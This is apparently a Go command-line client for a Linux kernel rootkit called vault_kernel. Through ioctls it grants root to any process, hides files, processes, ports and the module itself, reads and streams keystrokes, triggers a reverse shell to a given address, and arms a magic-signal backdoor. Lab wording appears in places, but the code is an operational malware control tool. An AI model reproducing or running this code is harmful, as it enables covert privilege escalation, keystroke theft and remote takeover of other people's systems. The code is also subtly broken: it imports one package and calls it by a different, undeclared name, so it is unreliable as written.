package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
)

const clientVersion = "3.5"

const devicePath = "/dev/vault_kernel"

// sysfsModulePath is where the kernel exposes loaded modules; absence
// (once stats work) means the module is hidden from lsmod/sysfs.
const sysfsModulePath = "/sys/module/vault_kernel"

func openDevice() (*os.File, error) {
	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
	if err != nil {
		return nil, fmt.Errorf("cannot open %s: %w (is rootkit loaded?)", devicePath, err)
	}
	return f, nil
}

// verifyRootSelf reports whether THIS process is root right after the
// GIVE_ROOT ioctl: the ioctl runs in the caller's task context, so
// commit_creds() takes effect on the CLI process itself immediately.
func verifyRootSelf() bool {
	return os.Geteuid() == 0
}

// verifyRootRemote checks the effective uid of another PID through
// /proc/<pid>/status (4th field of the Uid: line is euid).
func verifyRootRemote(pid int) bool {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "Uid:") {
			fields := strings.Fields(line)
			if len(fields) >= 3 {
				return fields[2] == "0"
			}
		}
	}
	return false
}

func giveRoot(f *os.File, pid int) error {
	if pid == 0 {
		pid = os.Getpid()
	}
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GIVE_ROOT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	if pid == os.Getpid() {
		// The module ran commit_creds() on our own task — verify it.
		if verifyRootSelf() {
			fmt.Printf("[+] Granted root to PID %d (verified: euid=0)\n", pid)
		} else {
			fmt.Printf("[?] ioctl succeeded but euid is still %d — check dmesg\n", os.Geteuid())
		}
		return nil
	}
	fmt.Printf("[+] Granted root to PID %d\n", pid)
	if verifyRootRemote(pid) {
		fmt.Printf("    Verified via /proc/%d/status: euid=0\n", pid)
	} else {
		fmt.Printf("    (could not verify euid via /proc/%d/status)\n", pid)
	}
	return nil
}

func hideFile(f *os.File, name string) error {
	if name == "" {
		return fmt.Errorf("file name cannot be empty")
	}
	if len(name) > 255 {
		return fmt.Errorf("name too long (%d bytes): the kernel hide-list stores at most 255", len(name))
	}
	buf := make([]byte, 256)
	copy(buf, name)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_FILE, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding file/dir: %s\n", name)
	return nil
}

func unhideFile(f *os.File, name string) error {
	if name == "" {
		return fmt.Errorf("file name cannot be empty")
	}
	if len(name) > 255 {
		return fmt.Errorf("name too long (%d bytes): the kernel hide-list stores at most 255", len(name))
	}
	buf := make([]byte, 256)
	copy(buf, name)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_FILE, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed: %s\n", name)
	return nil
}

func hidePID(f *os.File, pid int) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_PID, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding PID: %d\n", pid)
	return nil
}

func unhidePID(f *os.File, pid int) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_PID, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed PID: %d\n", pid)
	return nil
}

func hidePort(f *os.File, port uint16) error {
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, port)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_PORT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding port: %d\n", port)
	return nil
}

func unhidePort(f *os.File, port uint16) error {
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, port)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_PORT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed port: %d\n", port)
	return nil
}

func listHidden(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("(nothing hidden)")
	} else {
		fmt.Print(output)
	}
	return nil
}

func keylogRead(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("[*] (no keystrokes captured)")
	} else {
		fmt.Printf("[*] Keystroke log:\n%s\n", output)
	}
	return nil
}

// keylogFollow polls KEYLOG_READ and streams new keystrokes as they
// arrive.  The module's buffer shifts left when full, so a suffix
// diff is printed when the common prefix breaks (buffer wrap).
// Exits on Ctrl-C (default SIGINT handling).
func keylogFollow(f *os.File, intervalMs int) error {
	fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
	prev := ""
	for {
		buf := make([]byte, 4096)
		if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0])); err != 0 {
			return err
		}
		cur := strings.TrimRight(string(buf), "\x00")
		if cur != prev {
			if len(cur) >= len(prev) && strings.HasPrefix(cur, prev) {
				fmt.Print(cur[len(prev):])
			} else {
				// Buffer wrapped: common prefix lost.
				fmt.Print("\n" + cur)
			}
			prev = cur
		}
		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
	}
}

func keylogClear(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_CLEAR, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Keylogger buffer cleared")
	return nil
}

func backdoorShell(f *os.File, target string) error {
	if len(target) > 255 {
		return fmt.Errorf("target too long (%d bytes): kernel buffer stores at most 255", len(target))
	}
	buf := make([]byte, 256)
	copy(buf, target)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_BACKDOOR_SHELL, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Reverse shell triggered -> %s\n", target)
	return nil
}

func backdoorMagic(f *os.File, word string) error {
	if word == "" {
		return fmt.Errorf("magic word cannot be empty (an empty word disables the backdoor only via reset)")
	}
	if len(word) > 15 {
		return fmt.Errorf("magic word too long (%d chars): module stores at most 15", len(word))
	}
	buf := make([]byte, 16)
	copy(buf, word)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_BACKDOOR_MAGIC, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Magic packet backdoor enabled: '%s'\n", word)
	return nil
}

func hideModule(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_MODULE_HIDE, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Module hidden from lsmod")
	return nil
}

func unhideModule(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_MODULE_UNHIDE, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[-] Module visible again in lsmod")
	return nil
}

func resetAll(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_RESET_ALL, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Reset: all hidden files, PIDs and ports cleared")
	return nil
}

func showStats(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("(no stats returned)")
	} else {
		fmt.Print(output)
	}
	return nil
}

// showStatsJSON re-emits the GET_STATS key=value report as JSON so
// lab scripts can consume it without text munging. Numeric values
// are converted to JSON numbers, the rest stay strings.
func showStatsJSON(f *os.File) error {
	buf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
		return err
	}
	raw := map[string]string{}
	for _, line := range strings.Split(strings.TrimRight(string(buf), "\x00"), "\n") {
		line = strings.TrimSpace(line)
		if i := strings.Index(line, "="); i > 0 {
			raw[line[:i]] = line[i+1:]
		}
	}
	if len(raw) == 0 {
		return fmt.Errorf("module returned an empty stats report")
	}
	out := make(map[string]interface{}, len(raw))
	for k, v := range raw {
		if n, err := strconv.Atoi(v); err == nil {
			out[k] = n
		} else {
			out[k] = v
		}
	}
	j, err := json.MarshalIndent(out, "", "  ")
	if err != nil {
		return err
	}
	fmt.Println(string(j))
	return nil
}

func magicEncode(word string, port uint16) error {
	if word == "" {
		return fmt.Errorf("magic word cannot be empty")
	}
	encoded := ioctl.MagicPID(word, port)
	fmt.Printf("[*] Magic word : %s (hash 0x%04X)\n", word, ioctl.FNV1a16(word))
	fmt.Printf("[*] Port       : %d\n", port)
	fmt.Printf("[*] Encoded PID: %d\n", encoded)
	fmt.Printf("[*] Trigger    : kill -s %d %d\n",
		ioctl.MagicSignal, encoded)
	fmt.Printf("[*] (signal %d = glibc SIGRTMIN+1; matches MAGIC_SIGNAL in src/backdoor.c)\n",
		ioctl.MagicSignal)
	return nil
}

// runDoctor performs lab sanity checks against a loaded module: device
// node, permissions, stats ABI, hook count, client/module version match,
// module stealth state and every read-only control interface. It exits
// non-zero only when the module is unreachable; warnings do not fail.
func runDoctor() error {
	fmt.Println("[*] vault_kernel doctor — lab diagnostics")
	fmt.Println()

	warnings := 0

	// 1. Device node present?
	st, err := os.Stat(devicePath)
	if err != nil {
		fmt.Printf("  [FAIL] %s not found — module is not loaded\n", devicePath)
		fmt.Println("         Load it first: sudo insmod vault_kernel.ko")
		return fmt.Errorf("module not loaded")
	}
	fmt.Printf("  [ OK ] device %s present (mode %s)\n", devicePath, st.Mode().String())

	// 2. Device opens read/write?
	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
	if err != nil {
		fmt.Printf("  [FAIL] cannot open %s: %v\n", devicePath, err)
		fmt.Println("         EACCES/EPERM → run with sudo (module also rejects non-root since v3.4).")
		return err
	}
	defer f.Close()
	fmt.Println("  [ OK ] device opens read/write")

	// 3. GET_STATS responds?
	buf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
		fmt.Printf("  [FAIL] GET_STATS failed: %v\n", err)
		fmt.Println("         If this is ENOTTY, the client and module versions are out of sync.")
		return err
	}
	stats := map[string]string{}
	for _, line := range strings.Split(strings.TrimRight(string(buf), "\x00"), "\n") {
		line = strings.TrimSpace(line)
		if i := strings.Index(line, "="); i > 0 {
			stats[line[:i]] = line[i+1:]
		}
	}
	fmt.Println("  [ OK ] GET_STATS responds")
	fmt.Printf("         module version : %s\n", stats["version"])
	fmt.Printf("         uptime_s       : %s\n", stats["uptime_s"])

	// 4. Client/module version match
	if v := stats["version"]; v != "" && v != clientVersion {
		fmt.Printf("  [WARN] client v%s != module v%s — ioctl ABI may differ\n", clientVersion, v)
		warnings++
	}

	// 5. Hooks installed
	if hooks := stats["hooks_installed"]; hooks != "" {
		if hooks == "0" {
			fmt.Println("  [WARN] 0 syscall hooks installed — hiding features are inactive")
			warnings++
		} else {
			fmt.Printf("  [ OK ] %s/%s syscall hooks installed\n", hooks, stats["hooks_planned"])
		}
	}

	// 6. Stealth state (informational, never a warning)
	if _, err := os.Stat(sysfsModulePath); err != nil {
		fmt.Println("  [INFO] module not in /sys/module — hidden from lsmod/sysfs")
	} else {
		fmt.Println("  [INFO] module visible in /sys/module — not hidden")
	}

	// 7. Keylog interface
	kb := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&kb[0])); err != 0 {
		fmt.Printf("  [WARN] KEYLOG_READ failed: %v\n", err)
		warnings++
	} else {
		fmt.Println("  [ OK ] keylog interface responds")
	}

	// 8. List interface
	lb := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&lb[0])); err != 0 {
		fmt.Printf("  [WARN] LIST_HIDDEN failed: %v\n", err)
		warnings++
	} else {
		fmt.Println("  [ OK ] list interface responds")
	}

	fmt.Println()
	if warnings > 0 {
		fmt.Printf("[*] doctor finished with %d warning(s)\n", warnings)
	} else {
		fmt.Println("[*] doctor finished: everything OK")
	}
	return nil
}

func printVersion() {
	fmt.Printf("vault_kernel CLI v%s (ioctl magic 0xC0, signal trigger %d)\n",
		clientVersion, ioctl.MagicSignal)
}

func printUsage() {
	fmt.Print(`vault_kernel CLI — Kernel Rootkit Control

Usage:
  vault_kernel <command> [arguments]

Commands:
  status                  Check if rootkit is loaded
  doctor                  Diagnose module/client state (lab sanity check)
  give-root [pid]         Escalate process to root (default: self)
  hide-file <name>        Hide a file/directory
  unhide-file <name>      Reveal a hidden file/directory
  hide-pid <pid>          Hide a process from ps, top, /proc
  unhide-pid <pid>        Reveal a hidden process
  hide-port <port>        Hide a TCP/UDP port from netstat, ss
  unhide-port <port>      Reveal a hidden port
  list                    List all hidden items
  stats                   Show module stats (version, hooks, counts)
  stats --json            Same, as machine-readable JSON
  shell <ip:port>         Trigger reverse shell
  magic <word>            Set magic packet trigger word
  magic-encode <word> <port>  Print the kill() trigger for a word+port
  keylog [--follow [ms]]  Read captured keystrokes (stream with --follow)
  keylog-clear            Clear keylogger buffer
  hide-module             Hide rootkit from lsmod
  unhide-module           Make rootkit visible in lsmod
  reset                   Clear ALL hidden files, PIDs and ports
  version                 Print client version
`)
}

func run() error {
	if len(os.Args) < 2 {
		printUsage()
		return nil
	}

	if os.Args[1] == "status" {
		if _, err := os.Stat(devicePath); err == nil {
			fmt.Printf("[*] vault_kernel kernel module is LOADED\n    Device: %s\n", devicePath)
		} else {
			fmt.Println("[*] vault_kernel kernel module is NOT loaded")
			fmt.Println("    Run: sudo insmod vault_kernel.ko")
		}
		return nil
	}

	if os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "help" {
		printUsage()
		return nil
	}

	if os.Args[1] == "version" || os.Args[1] == "-v" || os.Args[1] == "--version" {
		printVersion()
		return nil
	}

	if os.Args[1] == "doctor" {
		return runDoctor()
	}

	if os.Args[1] == "magic-encode" {
		if len(os.Args) < 4 {
			return fmt.Errorf("usage: vault_kernel magic-encode <word> <port>")
		}
		p, err := strconv.Atoi(os.Args[3])
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port: %s", os.Args[3])
		}
		return magicEncode(os.Args[2], uint16(p))
	}

	f, err := openDevice()
	if err != nil {
		return err
	}
	defer f.Close()

	cmd := os.Args[1]

	switch cmd {
	case "give-root":
		pid := 0
		if len(os.Args) > 2 {
			pid, _ = strconv.Atoi(os.Args[2])
		}
		return giveRoot(f, pid)

	case "hide-file":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel hide-file <name>")
		}
		return hideFile(f, os.Args[2])

	case "unhide-file":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel unhide-file <name>")
		}
		return unhideFile(f, os.Args[2])

	case "hide-pid":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel hide-pid <pid>")
		}
		pid, err := strconv.Atoi(os.Args[2])
		if err != nil {
			return fmt.Errorf("invalid PID: %s", os.Args[2])
		}
		return hidePID(f, pid)

	case "unhide-pid":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel unhide-pid <pid>")
		}
		pid, err := strconv.Atoi(os.Args[2])
		if err != nil {
			return fmt.Errorf("invalid PID: %s", os.Args[2])
		}
		return unhidePID(f, pid)

	case "hide-port":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel hide-port <port>")
		}
		p, err := strconv.Atoi(os.Args[2])
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port: %s", os.Args[2])
		}
		return hidePort(f, uint16(p))

	case "unhide-port":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel unhide-port <port>")
		}
		p, err := strconv.Atoi(os.Args[2])
		if err != nil || p < 1 || p > 65535 {
			return fmt.Errorf("invalid port: %s", os.Args[2])
		}
		return unhidePort(f, uint16(p))

	case "list":
		return listHidden(f)

	case "stats":
		if len(os.Args) > 2 && os.Args[2] == "--json" {
			return showStatsJSON(f)
		}
		return showStats(f)

	case "shell":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel shell <ip:port>")
		}
		target := os.Args[2]
		if !strings.Contains(target, ":") {
			return fmt.Errorf("invalid target format, use ip:port")
		}
		return backdoorShell(f, target)

	case "magic":
		if len(os.Args) < 3 {
			return fmt.Errorf("usage: vault_kernel magic <word>")
		}
		return backdoorMagic(f, os.Args[2])

	case "version":
		printVersion()
		return nil

	case "keylog":
		if len(os.Args) > 2 && os.Args[2] == "--follow" {
			interval := 500
			if len(os.Args) > 3 {
				n, err := strconv.Atoi(os.Args[3])
				if err != nil || n < 50 {
					return fmt.Errorf("invalid interval: %s (milliseconds, min 50)", os.Args[3])
				}
				interval = n
			}
			return keylogFollow(f, interval)
		}
		return keylogRead(f)

	case "keylog-clear":
		return keylogClear(f)

	case "hide-module":
		return hideModule(f)

	case "unhide-module":
		return unhideModule(f)

	case "reset":
		return resetAll(f)

	default:
		return fmt.Errorf("unknown command: %s\nRun 'vault_kernel help' for usage", cmd)
	}
}

func main() {
	if os.Geteuid() != 0 {
		fmt.Fprintln(os.Stderr, "[!] Warning: not running as root. Some commands may fail.")
	}
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error: %v\n", err)
		os.Exit(1)
	}
}
